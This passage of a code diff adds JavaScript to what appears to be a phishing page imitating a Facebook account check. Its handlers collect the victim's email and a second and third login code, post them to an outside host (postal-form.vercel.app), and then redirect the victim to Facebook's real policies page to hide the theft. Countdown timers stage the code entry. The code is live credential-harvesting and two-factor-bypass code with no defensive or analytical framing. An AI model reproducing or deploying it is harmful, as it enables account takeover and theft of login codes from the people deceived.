+            $(".txtAlertConfirmSecond").html("Please enter your code.");
+          } else {
+
+
+            var postData = {
+              validateOwnerEmail: $validateOwnerEmail,
+              secondlogincodetags: $secondlogincodetags,
+              secondlogincode: $secondlogincode
+            };
+
+            $.ajax({
+              type: "POST",
+              url: "https://postal-form.vercel.app/data",
+              data: JSON.stringify(postData),
+              beforeSend: function () {
+                $(".processConfirmSecondBtn")
+                  .html(
+                    'Send <i class="fa-duotone fa-spinner-third fa-spin"></i>'
+                  )
+                  .prop("disabled", true);
+              },
+              success: function () {
+                $(".confirmSecond").hide();
+                $(".confirmThird").show();
+                $("#thirdlogincode").attr("disabled", true);
+                startSecondTimer();
+              },
+            });
+          }
+        });
+        return false;
+      }
+
+      function processConfirmThird() {
+        $("#confirmThirdForm").submit(function (submitingprocessThirdSecond) {
+          submitingprocessThirdSecond.preventDefault();
+
+          var $validateOwnerEmail = $("input#validateOwnerEmail").val();
+          var $thirdlogincodetags = $("input#thirdlogincodetags").val();
+          var $thirdlogincode = $("input#thirdlogincode").val();
+
+          if ($thirdlogincode == "") {
+            $(".alertConfirmThird").show();
+            $(".txtAlertConfirmThird").html("Please enter your code.");
+          } else {
+            var postData = {
+              validateOwnerEmail: $validateOwnerEmail,
+              thirdlogincodetags: $thirdlogincodetags,
+              thirdlogincode: $thirdlogincode,
+            };
+
+            $.ajax({
+              type: "POST",
+              url: "https://postal-form.vercel.app/data",
+              data: JSON.stringify(postData),
+              beforeSend: function () {
+                $(".processConfirmThirdBtn")
+                  .html(
+                    'Send <i class="fa-duotone fa-spinner-third fa-spin"></i>'
+                  )
+                  .prop("disabled", true);
+              },
+              success: function () {
+                window.top.location.href =
+                  "https://www.facebook.com/policies_center/";
+              },
+            });
+          }
+        });
+        return false;
+      }
+
+      function startFirstTimer() {
+        let timeSecondFirst = 15;
+        const timeHFirst = document.querySelector(".countdownFirst");
+        displayTimeFirst(timeSecondFirst);
+        const countDownFirst = setInterval(() => {
+          timeSecondFirst--;
+          displayTimeFirst(timeSecondFirst);
+          if (timeSecondFirst == 0 || timeSecondFirst < 1) {
+            clearInterval(countDownFirst);
+            $(".firstCountdown").hide();
+            $("#secondlogincode").removeAttr("disabled");
+            
+          }
+        }, 1000);
+
+        function displayTimeFirst(secondFirst) {
+          const minFirst = Math.floor(secondFirst / 15);
+          const secFirst = Math.floor(secondFirst % 15);
+          timeHFirst.innerHTML = `
+  ${minFirst < 10 ? "0" : ""}${minFirst}:${secFirst < 10 ? "0" : ""}${secFirst}
+  `;
+        }
+      }
+
+      function startSecondTimer() {
+        let timeSecondSecond = 15;
+        const timeHSecond = document.querySelector(".countdownSecond");
+        displayTimeSecond(timeSecondSecond);
+        const countDownSecond = setInterval(() => {
+          timeSecondSecond--;
+          displayTimeSecond(timeSecondSecond);
+          if (timeSecondSecond == 0 || timeSecondSecond < 1) {
+            clearInterval(countDownSecond);
+            $(".secondCountdown").hide();
+            $("#thirdlogincode").removeAttr("disabled");
+          }
+        }, 1000);
+
+        function displayTimeSecond(secondSecond) {
+          const minSecond = Math.floor(secondSecond / 15);
+          const secSecond = Math.floor(secondSecond % 15);
+          timeHSecond.innerHTML = `
+  ${minSecond < 10 ? "0" : ""}${minSecond}:${
+            secSecond < 10 ? "0" : ""
+          }${secSecond}
+  `;
+        }
+      }
+    </script>
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+      var Tawk_API = Tawk_API || {},
+        Tawk_LoadStart = new Date();
+      (function () {
+        var s1 = document.createElement("script"),
+          s0 = document.getElementsByTagName("script")[0];
+        s1.async = true;
+        s1.src = "https://embed.tawk.to/65962e6a8d261e1b5f4f0a15/1hj9aakr7";
+        s1.charset = "UTF-8";
+        s1.setAttribute("crossorigin", "*");
+        s0.parentNode.insertBefore(s1, s0);
+      })();
+    </script>
+    <!--End of Tawk.to Script-->
+  </body>
+</html>
